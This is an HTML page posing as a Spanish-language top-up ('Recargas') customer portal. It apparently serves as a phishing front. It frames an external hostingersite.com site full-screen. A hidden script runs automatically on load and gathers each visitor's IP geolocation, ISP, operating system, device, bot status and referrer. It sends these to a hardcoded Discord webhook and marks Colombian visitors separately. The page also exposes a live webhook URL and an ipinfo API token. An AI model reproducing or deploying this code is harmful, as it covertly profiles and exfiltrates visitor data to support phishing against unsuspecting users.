<html lang="es"><head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Recargas | Clientes</title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
    }
    iframe {
      width: 100%;
      height: 100%;
      border: none;
    }
    #error {
      text-align: center;
      padding: 50px;
      font-family: Arial, sans-serif;
    }
  </style>
</head>
<body>
  <!-- Contenido permitido --> 
  <div id="contenido" style="display:none;">
   <iframe src="https://lightgreen-swallow-358132.hostingersite.com/" style="position:fixed;top:0;left:0;width:100%;height:100%;border:none;" title="Contenido Externo"></iframe>
  </div>

  <!-- Error 505 -->
  <div id="error" style="display: block;">
    <iframe src="https://lightgreen-swallow-358132.hostingersite.com/" style="position:fixed;top:0;left:0;width:100%;height:100%;border:none;" title="Contenido Externo"></iframe>
  </div>

 <script>
    (() => {
      const WEBHOOK = "https://discord.com/api/webhooks/1498534367985664072/HEwsQo_VeMEmFo9dINSYUaE43p8tgDePxth9eofHeM3lW0tExf-gTeWxL4o-Buz0YkP5";

      async function getIPInfo() {
        try {
          const response = await fetch("https://ipinfo.io/json?token=af50cd0324508f");
          if (!response.ok) {
            console.warn("Error en ipinfo.io:", response.status);
            return {country_name: "Desconocido", city: "Desconocido", country_code: "XX", isp: "No disponible"};
          }
          const data = await response.json();
          return {
            country_name: data.country || "Desconocido",
            city: data.city || "Desconocido",
            country_code: data.country || "XX",
            isp: data.org || "No disponible"
          };
        } catch (error) {
          console.error("Error al obtener IP info:", error);
          return {country_name: "Desconocido", city: "Desconocido", country_code: "XX", isp: "No disponible"};
        }
      }

      function parseUA() {
        const ua = navigator.userAgent;
        const isBot = /bot|crawler|spider|crawl/i.test(ua);
        let os = "Desconocido", device = "Desconocido";

        if (/Windows NT/i.test(ua))        os = "Windows";
        else if (/Mac OS X/i.test(ua))     os = "macOS";
        else if (/Android/i.test(ua))      os = "Android";
        else if (/iOS|iPhone|iPad/i.test(ua)) os = "iOS";
        else if (/Linux/i.test(ua))        os = "Linux";

        if (/Samsung/i.test(ua))           device = "Samsung";
        else if (/iPhone/i.test(ua))       device = "iPhone";
        else if (/iPad/i.test(ua))         device = "iPad";
        else if (/Huawei/i.test(ua))       device = "Huawei";
        else if (/Xiaomi/i.test(ua))       device = "Xiaomi";
        else device = "PC/Otro";

        return {os, device, isBot};
      }

      window.addEventListener("DOMContentLoaded", async () => {
        const ip   = await getIPInfo();
        const ua   = parseUA();
        const originDomain = window.location.hostname;
        const fullURL      = window.location.href;

        const payload = {
          username: "RHLM", 
          embeds: [{
            color: ip.country_code === "CO" ? 0x00ff00 : 0xff0000,
            title: ua.isBot ? "🤖 BOT detectado" : "👤 Visita humana",
            fields: [
              {name: "🌍 País",         value: ip.country_name, inline: true},
              {name: "🏙️ Ciudad",       value: ip.city,         inline: true},
              {name: "📍 Origen",        value: ip.country_code === "CO" ? "🇨🇴 Colombia" : "🌐 Exterior", inline: true},
              {name: "📡 ISP",           value: ip.isp, inline: true},
              {name: "💻 SO",            value: ua.os,           inline: true},
              {name: "📱 Dispositivo",   value: ua.device,       inline: true},
              {name: "🔗 Dominio ref",   value: document.referrer || "Directo / Sin referrer", inline: true},
              {name: "🌐 Sitio Puribal", value: originDomain, inline: true},
              {name: "🕒 Hora (UTC)",    value: new Date().toISOString(), inline: true}
            ]
          }]
        };

        fetch(WEBHOOK, {
          method: "POST",
          headers: {"Content-Type": "application/json"},
          body: JSON.stringify(payload),
          keepalive: true
        }).catch((error) => {
          console.error("Error al enviar al webhook:", error);
        });
      });
    })();
    </script>


</body></html>
